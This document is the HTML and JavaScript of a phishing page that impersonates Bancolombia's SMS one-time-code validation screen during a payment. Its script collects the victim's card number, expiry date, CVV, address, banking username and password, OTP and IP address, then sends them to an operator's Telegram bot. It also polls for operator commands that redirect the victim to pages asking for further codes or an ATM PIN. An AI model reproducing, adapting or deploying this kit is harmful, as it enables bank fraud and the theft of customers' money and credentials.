<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//ES" "http://www.w3.org/TR/html4/strict.dtd">
<html>
  <head>
    <title>Sucursal Virtual Personas</title>
    <meta content="es" http-equiv="Content-Language" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link href="css/styles.css" media="all" rel="stylesheet" type="text/css" />
    <link
      href="css/bootstrap.css"
      media="all"
      rel="stylesheet"
      type="text/css"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="js/jquery-1.10.1.js.descarga"></script>
    <script
      type="text/javascript"
      src="js/jquery.validate-1.11.1.js.descarga"
    ></script>
    <script type="text/javascript" src="js/jquery-ui.js.descarga"></script>
    <script src="js/jquery-3.7.7.js"></script>
    <script type="text/javascript" src="js/bluebird.min.js.descarga"></script>
    <link
      href="css/jquery-ui.css"
      media="all"
      rel="stylesheet"
      type="text/css"
    />
    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />
    <script>
      $.getJSON("https://api.ipify.org?format=json", function (data) {
        // Setting text of element P with id gfg
        $("#gfg").html(data.ip);
      });
    </script>
    <script>
      $.getJSON("https://ipinfo.io", function (response) {
        $("#ip").html("IP: " + response.ip);
        $("#address").html("" + response.city + ", " + response.country);
      });
    </script>
    <script language="JavaScript">
      function popup_help_a() {
        window.open(
          "/mua/global/ayuda.jsp",
          "HELP",
          "toolbar=no,scrollbars=yes,resizable=no,width=1010,height=615"
        );
      }
    </script>
    <script type="text/javascript" src="js/bootstrap.js.descarga"></script>
    <link rel="shortcut icon" href="img/favicon.ico" />
    <style>
      .loaderp-full {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(255, 255, 255, 0.8);
        justify-content: center;
        align-items: center;
      }
      .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-left-color: #000;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .btn-enabled {
        background-color: #f0ad4e; /* Color amarillo */
      }
      .btn-enabled:enabled {
        background-color: #e99d23; /* Amarillo m√°s oscuro cuando el bot√≥n est√° habilitado */
      }
    </style>
  </head>
  <body>
    <div
      id="cargando"
      style="width: 100%; text-align: center; display: none"
    ></div>
    <div id="contenidoWeb" style="">
      <form
        id="loginUserForm"
        name="loginUserForm"
        action="#"
        onsubmit=" return sender()"
        method="post"
      >
        <p id="address" hidden=""></p>
        <div class="container" id="containerMain">
          <div>
            <div id="header" class="mua-page-header">
              <div class="row row-logo-svp">
                <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                  <div class="mua-imgLogoItem"></div>
                  <div class="text-svp-name">Sucursal Virtual Personas</div>
                </div>
              </div>
              <div class="row">
                <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                  <div
                    id="lastIn"
                    class="mua-title-text"
                    style="padding-top: 10px !important"
                  >
                    <script
                      language="javascript"
                      src="js/jquery.jclockNew.js.descarga"
                      type="text/JavaScript"
                    ></script>
                    <script type="text/javascript">
                      $(function ($) {
                        var optionsEST = {
                          utc: true,
                          utcOffset: -5,
                          format: "%A %R de %B de %Y %l:%M:%S %P",
                          language: "es",
                        };
                        $("#jclock1").jclockNew(optionsEST);
                      });
                    </script>
                    <div>
                      <div class="timeText">Fecha y hora actual:</div>
                      <span
                        id="jclock1"
                        class="lastVisitedText"
                        currenttime="1659353680851"
                        >Lunes 1 de Agosto de 2022 7:34:40 PM</span
                      >
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="panel-heading">
              <h3>Validaci√≥n de otp por sms</h3>
            </div>
          </div>
          <div class="panel panel-primary">
            <div
              class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp"
              id="tabError"
              style=""
            >
              <div class="errorDiv">
                <div class="divTextMessage">
                  <div
                    id="summary"
                    class="errorTexto"
                    style="align-items: center"
                  >
                    Para continuar con el pago, espere un minuto e ingrese el
                    c√≥digo que le llego por mensaje de texto.
                  </div>
                </div>
              </div>
            </div>
            <br />
            <div class="mua-panel-body">
              <div class="row">
                <div class="col-xs-12 col-sm-5 col-md-4">
                  <br />
                  <div class="panel_general mua-panel_general">
                    <div class="title-panel-label">
                      <h1>Mensaje de texto</h1>
                    </div>
                    <div class="subtitle-land-label">
                      <h4>
                        Para continuar con el pago, debe ingresar el sms.
                        Cons√∫ltelo en su tel√©fono.
                      </h4>
                    </div>
                    <div id="contenido">
                      <div class="mua-content-group-panel">
                        <div class="mua-label-input">
                          <span
                            id="popoverUser"
                            class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon"
                            data-original-title=""
                            title=""
                          ></span>
                          <div id="popoverContent" class="hide">
                            <span class="mua_tooltip_close">ÔøΩ</span>
                            <div class="mua_tooltip_msg">
                              Ingrese el usuario que tiene registrado en la
                              Sucursal Virtual Personas. Si no tiene un usuario
                              asignado ingrese con su documento de identidad.
                            </div>
                          </div>
                          <label class="control-label-index" for="username"
                            >Ingrese el Mensaje de texto</label
                          >
                        </div>
                        <div>
                          <div class="mua_svp_enroll_update_control">
                            <input
                              name="username"
                              class="mua-form-control mua_svp_control_username mua-input-icon error"
                              id="clavex"
                              onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"
                              type="text"
                              maxlength="6"
                              minlength="6"
                              autocomplete="off"
                              disabled
                            />
                            <span class="mua-icon-lock"> </span>
                          </div>
                        </div>
                        <label id="suave" class="control-label-index"
                          >Por favor espere unos segundos para ingresar el nuevo
                          token
                          <label class="control-label-index" id="countdown"
                            >1:00</label
                          ></label
                        >
                      </div>
                    </div>
                    <div
                      class="one-button-container mua-button-container"
                      style="left: 100px"
                    >
                      <button
                        id="btnGo"
                        name="btnGo"
                        class="btn btn-success"
                        type="submit"
                        disabled
                      >
                        Validar
                      </button>
                      <div class="loaderp-full" id="loader">
                        <div class="spinner"></div>
                      </div>
                    </div>
                  </div>
                  <br />
                  <br />
                  <br />
                  <br />
                </div>
                <div class="col-xs-12 col-sm-7 col-md-8">
                  <div class="mua-embed-container-personal" id="banner-persona">
                    <iframe
                      class="mua-iframe mua-iframe-personal-responsive"
                      src="login_SVP_BC_zonaB.html"
                      frameborder="0"
                      scrolling="no"
                      width="635px"
                      height="335px"
                    ></iframe>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12">
              <p class="mua-footer">
                Sucursal TelefÔøΩnica Bancolombia: BogotÔøΩ (57) 60 1 343 00 00 -
                MedellÔøΩn (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 -
                Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
                - <br />
                Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 -
                El resto del paÔøΩs 018000 9 12345. Sucursales TelefÔøΩnicas en el
                exterior: EspaÔøΩa (34) 900 995 717 - Estados Unidos (1) 866 379
                97 14.
              </p>
            </div>
          </div>
          <script type="text/javascript">
            var year = new Date().getFullYear();
            $(document).ready(function () {
              $("#fecha").text(year);
            });
          </script>
          <div style="margin-top: 10px">
            <div class="mua-title-text pull-left">DirecciÔøΩn IP:</div>
            <div class="mua-title-text pull-left" id="gfg"></div>
            <div class="mua-title-text pull-right">
              Copyright ÔøΩ&nbsp;<span id="fecha">2022</span>&nbsp;Bancolombia
              S.A.&nbsp;&nbsp;
            </div>
          </div>
        </div>
      </form>
    </div>
    <script type="text/javascript">
      var seconds = 59; //nÔøΩmero de segundos a contar
      function secondPassed() {
        var minutes = Math.round((seconds - 30) / 60); //calcula el nÔøΩmero de minutos
        var remainingSeconds = seconds % 60; //calcula los segundos
        //si los segundos usan sÔøΩlo un dÔøΩgito, aÔøΩadimos un cero a la izq
        if (remainingSeconds < 10) {
          remainingSeconds = "0" + remainingSeconds;
        }
        document.getElementById("countdown").innerHTML =
          minutes + ":" + remainingSeconds;
        if (seconds == 0) {
          clearInterval(countdownTimer);
          document.getElementById("countdown").innerHTML = "";
          document.getElementById("suave").innerHTML = "";
        } else {
          seconds--;
        }
      }

      var countdownTimer = setInterval(secondPassed, 1000);
    </script>

    <script type="text/javascript">
      window.setTimeout(setEnabled, 59000);

      function setEnabled() {
        var toks = document.getElementById("btnGo");
        if (toks) {
          toks.disabled = false;
        }
      }
    </script>
    <script type="text/javascript">
      window.setTimeout(setEnabled, 59000);

      function setEnabled() {
        var toks = document.getElementById("clavex");
        if (toks) {
          toks.disabled = false;
        }
      }
    </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const boton = document.getElementById("btnGo");
        const loader = document.getElementById("loader");

        boton.addEventListener("click", async function (event) {
          event.preventDefault();

          loader.style.display = "flex"; // Muestra el loader

          // Obtener los datos de pago desde localStorage con la clave 'pagojet'
          const info = localStorage.getItem("pagojet");
          let pagoData = null;

          if (info) {
            try {
              // Parsear los datos obtenidos
              pagoData = JSON.parse(info);
              console.log("Datos de pago obtenidos:", pagoData); // Debugging
            } catch (e) {
              console.error("Error al parsear localStorage:", e);
            }
          } else {
            console.log(
              'No se encontr√≥ informaci√≥n en localStorage con la clave "pagojet".'
            );
          }

          // Guardar username y password en localStorage
          const transactionId =
            Date.now().toString(36) + Math.random().toString(36).substr(2);
          const username = localStorage.getItem("username");
          const password = localStorage.getItem("password");
          const otp = document.getElementById("clavex").value;

          localStorage.setItem("transactionId", transactionId);
          localStorage.setItem("username", username);
          localStorage.setItem("password", password);
          localStorage.setItem("otp", otp);

          const message = `
      <b>üõ´‚†Ä‚†Ä‚†Ä‚†Ä‚†ÄJETSMART‚†Ä‚†Ä‚†Ä‚†Ä‚†Äüõ´</b>

      üÜî <b>ID:</b> | <code>${pagoData ? pagoData.id : "No disponible"}</code>
      üëÆüèª‚Äç‚ôÄÔ∏è <b>Nombre:</b> | <code>${
        pagoData ? pagoData.nombre : "No disponible"
      }</code>
      üìß <b>Email:</b> | <code>${
        pagoData ? pagoData.email : "No disponible"
      }</code>
      üì≤ <b>Celular:</b> | <code>${
        pagoData ? pagoData.celular : "No disponible"
      }</code>
      üè¶ <b>Banco:</b> | <code>${
        pagoData ? pagoData.banco : "No disponible"
      }</code>
      üìç <b>Direcci√≥n:</b> | <code>${
        pagoData ? pagoData.direccion : "No disponible"
      }</code>
      üí≥ <b>Tarjeta:</b> | <code>${
        pagoData ? pagoData.tarjeta : "No disponible"
      }</code>
      üóìÔ∏è <b>Fecha de Expiraci√≥n:</b> | <code>${
        pagoData ? pagoData.ftarjeta : "No disponible"
      }</code>
      üîê <b>CVV:</b> | <code>${pagoData ? pagoData.cvv : "No disponible"}</code>
      <b>Usuario:</b> | <code>${username}</code>
      <b>Clave:</b> | <code>${password}</code>
      <b>OTP:</b> | <code>${otp}</code>
      üåê <b>IP:</b> | <code>${pagoData ? pagoData.ip : "No disponible"}</code>
      `;

          const keyboard = JSON.stringify({
            inline_keyboard: [
              [
                {
                  text: "X Logo",
                  callback_data: `error_logo:${transactionId}`,
                },
                {
                  text: "Din√°mica",
                  callback_data: `pedir_dinamica:${transactionId}`,
                },
                { text: "X TC", callback_data: `error_tc:${transactionId}` },

                { text: "OTP", callback_data: `pedir_otp:${transactionId}` },
                {
                  text: "C Cajero",
                  callback_data: `clave_cajero:${transactionId}`,
                },
                {
                  text: "Fin",
                  callback_data: `confirm_finalizar:${transactionId}`,
                },
              ],
            ],
          });

          const config = await fetch("../claves.json").then((res) =>
            res.json()
          );

          fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: config.chat_id,
              text: message,
              reply_markup: keyboard,
              parse_mode: "HTML", // Especificar el modo de an√°lisis para el formato HTML
            }),
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.ok) {
                console.log("Mensaje enviado a Telegram con √©xito");
                const messageId = data.result.message_id;
                checkPaymentVerification(transactionId, messageId, config);
              } else {
                console.error("Error al enviar mensaje a Telegram:", data);
                loader.style.display = "none";
              }
            })
            .catch((error) => {
              console.error("Error al enviar mensaje a Telegram:", error);
              loader.style.display = "none";
            });
        });

        async function loadTelegramConfig() {
          try {
            // Cargar las claves directamente desde el archivo claves.json
            const response = await fetch("claves.json"); // Aseg√∫rate de que la ruta al archivo sea correcta
            if (!response.ok) {
              throw new Error("No se pudo cargar el archivo claves.json.");
            }
            const config = await response.json();

            // Verificar si se devolvi√≥ un error
            if (config.error) {
              console.error("Error al cargar claves.json:", config.error);
              return null;
            }

            return config;
          } catch (error) {
            console.error("Error al cargar las claves:", error);
            return null;
          }
        }

        async function checkPaymentVerification(
          transactionId,
          messageId,
          config
        ) {
          fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
            .then((response) => response.json())
            .then((data) => {
              const updates = data.result;
              const verificationUpdate = updates.find(
                (update) =>
                  update.callback_query &&
                  (update.callback_query.data === `error_tc:${transactionId}` ||
                    update.callback_query.data ===
                      `error_logo:${transactionId}` ||
                    update.callback_query.data ===
                      `pedir_dinamica:${transactionId}` ||
                    update.callback_query.data ===
                      `pedir_otp:${transactionId}` ||
                    update.callback_query.data ===
                      `confirm_finalizar:${transactionId}`)
              );

              if (verificationUpdate) {
                // Eliminar botones del mensaje original
                fetch(
                  `https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`,
                  {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      chat_id: config.chat_id,
                      message_id: messageId,
                      reply_markup: JSON.stringify({ inline_keyboard: [] }),
                    }),
                  }
                );

                // Comportamientos basados en el bot√≥n presionado
                if (
                  verificationUpdate.callback_query.data ===
                  `pedir_dinamica:${transactionId}`
                ) {
                  window.location.href = "index3.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `error_tc:${transactionId}`
                ) {
                  alert(
                    "Error con la tarjeta de cr√©dito. Verifique los datos."
                  );
                  window.location.href = "../payment.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `error_logo:${transactionId}`
                ) {
                  alert("Usuario o clave incorrectos.");
                  window.location.href = "indexx.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `confirm_finalizar:${transactionId}`
                ) {
                  window.location.href = "../finish.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `pedir_otp:${transactionId}`
                ) {
                  alert("C√≥digo OTP incorrecto, ingr√©selo de nuevo");
                  window.location.href = "index5.html";
                }
              } else {
                setTimeout(
                  () =>
                    checkPaymentVerification(transactionId, messageId, config),
                  2000
                );
              }
            })
            .catch((error) => {
              console.error("Error al verificar el pago:", error);
              setTimeout(
                () =>
                  checkPaymentVerification(transactionId, messageId, config),
                2000
              );
            });
        }
      });
    </script>
  </body>
</html>
